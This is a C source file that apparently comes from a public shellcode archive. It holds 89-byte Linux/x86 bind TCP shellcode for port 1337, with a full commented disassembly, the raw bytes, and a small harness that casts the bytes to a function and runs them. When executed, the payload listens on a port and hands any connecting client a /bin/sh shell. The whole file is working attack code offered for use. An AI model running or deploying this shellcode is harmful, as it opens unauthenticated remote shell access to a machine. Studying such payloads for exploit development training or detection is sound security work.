/*
*  Title:    Shell Bind TCP Shellcode Port 1337 - 89 bytes
*  Platform: Linux/x86
*  Date:     2014-07-13
*  Author:   Julien Ahrens (@MrTuxracer)
*  Website:  http://www.rcesecurity.com
*
*  Disassembly of section .text:
*  00000000 <_start>:
*  0:   6a 66                push   0x66
*  2:   58                   pop    eax
*  3:   6a 01                push   0x1
*  5:   5b                   pop    ebx
*  6:   31 f6                xor    esi,esi
*  8:   56                   push   esi
*  9:   53                   push   ebx
*  a:   6a 02                push   0x2
*  c:   89 e1                mov    ecx,esp
*  e:   cd 80                int    0x80
* 10:   5f                   pop    edi
* 11:   97                   xchg   edi,eax
* 12:   93                   xchg   ebx,eax
* 13:   b0 66                mov    al,0x66
* 15:   56                   push   esi
* 16:   66 68 05 39          pushw  0x3905
* 1a:   66 53                push   bx
* 1c:   89 e1                mov    ecx,esp
* 1e:   6a 10                push   0x10
* 20:   51                   push   ecx
* 21:   57                   push   edi
* 22:   89 e1                mov    ecx,esp
* 24:   cd 80                int    0x80
* 26:   b0 66                mov    al,0x66
* 28:   b3 04                mov    bl,0x4
* 2a:   56                   push   esi
* 2b:   57                   push   edi
* 2c:   89 e1                mov    ecx,esp
* 2e:   cd 80                int    0x80
* 30:   b0 66                mov    al,0x66
* 32:   43                   inc    ebx
* 33:   56                   push   esi
* 34:   56                   push   esi
* 35:   57                   push   edi
* 36:   89 e1                mov    ecx,esp
* 38:   cd 80                int    0x80
* 3a:   59                   pop    ecx
* 3b:   59                   pop    ecx
* 3c:   b1 02                mov    cl,0x2
* 3e:   93                   xchg   ebx,eax
*
* 0000003f <loop>:
* 3f:   b0 3f                mov    al,0x3f
* 41:   cd 80                int    0x80
* 43:   49                   dec    ecx
* 44:   79 f9                jns    3f <loop>
* 46:   b0 0b                mov    al,0xb
* 48:   68 2f 2f 73 68       push   0x68732f2f
* 4d:   68 2f 62 69 6e       push   0x6e69622f
* 52:   89 e3                mov    ebx,esp
* 54:   41                   inc    ecx
* 55:   89 ca                mov    edx,ecx
* 57:   cd 80                int    0x80
*/

#include <stdio.h>

unsigned char shellcode[] = \
"\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80";

main()
{
printf("Shellcode Length:  %d\n", sizeof(shellcode) - 1);
int (*ret)() = (int(*)())shellcode;
ret();
}